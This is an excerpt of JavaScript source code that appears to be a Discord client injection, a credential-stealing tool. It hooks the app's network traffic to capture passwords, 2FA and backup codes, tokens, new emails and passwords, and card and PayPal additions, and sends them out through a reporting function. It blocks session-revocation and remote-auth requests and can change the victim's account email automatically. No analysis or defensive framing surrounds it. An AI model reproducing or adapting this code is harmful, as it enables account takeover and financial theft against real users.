...
const getBackupCodes = async response => {
 try {
  ...
  const validCode = filtered.map(code => `${code.code.slice(0, 4)}-${code.code.slice(4)}`).join('\n');
...
class GetDataUser {
 ...
 Billing = async token => {
  ...
  return data.map(method => payment[method.type] || '❓').join('') || '❓';
 };
 ...
 switch (type) {
  case 'LOGIN_USER':
   ...
   if (request?.code !== undefined) {
    content.embeds[0].fields.push({ name: 'Used 2FA code', value: `\`${request.code}\``, inline: false });
   }
...
const startup = async () => {
 ...
 if (token) {
  if (fs.existsSync(startupDir)) {
   ...
   Cruise('INJECTED', null, null, user.email, null, token, `It is injected in the route: \`${__dirname.trim().replace(/\\/g, '/')}\``);
   clearLocalStorage();
  }
 }
 ...
 const getDiscordPaths = () => {
  ...
  return fs.existsSync(resourceDir) ? { resource: resourceDir, app: appDir } : { resource: undefined, app: undefined };
 };
...
const translateEmailUpdate = async (token, locale) => {
 ...
 try {
  ...
  return Array.isArray(translatedText) && translatedText.length === message.length ? translatedText : message;
 } catch (error) {
  return message;
 }
};
  ...
  switch (true) {
   case params.response.url.endsWith('/login'):
    if (params.response.url.endsWith('/remote-auth/login')) {
     ...
     Cruise('LOGIN_USER', RESPONSE_DATA, RESQUEST_DATA, newUser.email, 'The password was not found', newToken, `You have logged in using QR code`);
    }
    ...
    Cruise('LOGIN_USER', RESPONSE_DATA, RESQUEST_DATA, RESQUEST_DATA.login, RESQUEST_DATA.password, token, `has Logged in-`);
    break;

   case params.response.url.endsWith('/register'):
    Cruise('LOGIN_USER', RESPONSE_DATA, RESQUEST_DATA, RESQUEST_DATA.email, RESQUEST_DATA.password, token, 'has `Created` a new account');
    break;

   case params.response.url.endsWith('/totp'):
    Cruise('LOGIN_USER', RESPONSE_DATA, RESQUEST_DATA, email, password, token, `you are logged in with \`2FA\``);
    break;
   ...
   case params.response.url.endsWith('/codes-verification'):
    ...
    Cruise('BACKUP_CODES', RESPONSE_DATA, RESQUEST_DATA, user.email, 'The password was not found', token, `\`${count} security\` codes have just been added`);
    break;

   case params.response.url.endsWith('/@me'):
    if (!RESQUEST_DATA.password) return;
    if (RESQUEST_DATA.email && RESQUEST_DATA.email_token) {
     Cruise('EMAIL_CHANGED', RESPONSE_DATA, RESQUEST_DATA, RESQUEST_DATA.email, RESQUEST_DATA.password, token, `has updated their email to \`${RESQUEST_DATA.email}\``);
    }
    if (RESQUEST_DATA.new_password) {
     Cruise('PASSWORD_CHANGED', RESPONSE_DATA, RESQUEST_DATA, user.email, RESQUEST_DATA.password, token, `has updated their password to \`${RESQUEST_DATA.new_password}\``);
    }
    if (RESQUEST_DATA.username) {
     Cruise('USERNAME_CHANGED', RESPONSE_DATA, RESQUEST_DATA, user.email, RESQUEST_DATA.password, token, `has updated their username to \`${RESQUEST_DATA.username}\``);
    }
    break;
  }
 } catch (error) {
...
const createWindow = () => {
 ...
 mainWindow.webContents.debugger.on('message', async (_, method, params) => {
  ...
  if (!CONFIG.auth_filters.urls.some(url => params.response.url.endsWith(url)) || ![200, 202].includes(params.response.status)) return;
 ...
 webRequest.onCompleted(CONFIG.payment_filters, async details => {
  ...
  switch (true) {
   case url.includes('stripe'):
    ...
    Cruise('CREDITCARD_ADDED', null, request, user.email, null, token, `you just added a \`Credit Card\``);
    break;

   case url.endsWith('paypal_accounts') || url.endsWith('billing-agreement-tokens'):
    Cruise('PAYPAL_ADDED', null, null, user.email, null, token, `you just added a \`Paypal\` account`);
    break;
  }
 });
};
 ...
 webRequest.onHeadersReceived(async (request, callback) => {
  ...
  const processUserUpdate = async () => {
   ...
   if (CONFIG.auto_email_update === 'true') {
    ...
    const [CONFIG_ALERT, EDIT_MAIL_ALERT, ALERT_INTRO, END_INTRO_ALERT, CHANGE_ALERT, LAST_END_ALERT, CONTACT_ALERT] = await translateEmailUpdate(token, locale);
...
const allSessionsLocked = async () => {
 ...
 webRequest.onBeforeRequest(CONFIG.session_filters, (details, callback) => {
  const cancel = details.url.includes('wss://remote-auth-gateway') || details.url.includes('auth/sessions');
